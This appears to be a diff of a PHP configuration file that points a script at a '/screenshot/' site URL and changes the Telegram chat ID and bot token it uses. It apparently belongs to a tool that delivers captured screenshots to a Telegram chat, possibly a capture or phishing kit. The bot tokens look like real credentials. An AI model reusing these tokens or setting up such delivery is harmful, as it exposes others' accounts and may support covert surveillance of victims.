@@ -9,12 +9,12 @@ $site='https://mr-campy.xyz/screenshot/';
 
 //enter chat id or telegram user id
 
-$chat_id='1679260751';
+$chat_id='6722166633';
 
 //enter your bot token here
 
 
-$token='5133941394:AAFtTDZg3_STxltKV0tIQ_uqnOw7UySOuUo';
+$token='7588554746:AAHB-0BHIR96G3W0m6wK8cxB44Zugd3YUtU';
 
 ?>
 
